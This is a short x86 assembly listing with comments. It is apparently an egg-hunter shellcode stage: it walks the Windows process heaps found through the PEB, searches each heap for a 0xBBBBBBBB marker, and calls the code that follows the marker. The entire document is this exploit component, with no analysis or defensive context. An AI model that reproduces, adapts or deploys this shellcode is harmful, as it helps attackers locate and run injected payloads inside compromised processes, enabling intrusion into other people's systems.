xor eax,eax
mov edx,dword ptr fs:[eax+30]							;Get The PEB		
add eax,7F
add eax,11												;set eax == 90
mov esi,dword ptr [eax+edx]								;edx + 90 --> *ProcessHeaps
mov ecx,dword ptr [eax+edx-4]							;edx + 88 --> NumberOfHeaps
GET_HEAP:
lods dword ptr [esi]									;Get Heap Entry	
push ecx												;Save NumberOfHeaps
mov edi,eax
mov eax,dword ptr [eax+58]								;Get Segments[64]
mov ecx,dword ptr [eax+38]								;Get LastEntryInSecgment
sub ecx,edi												;Get SizeOfHeap
mov eax,BBBBBBBC
dec eax
NO_YET:
repne scas byte ptr es:[edi]
test ecx,ecx
je NEXT_HEAP
cmp dword ptr [edi-1],eax
jnz NO_YET
call dword ptr [edi+3]
NEXT_HEAP:
pop ecx
dec ecx
test ecx,ecx
jnz GET_HEAP
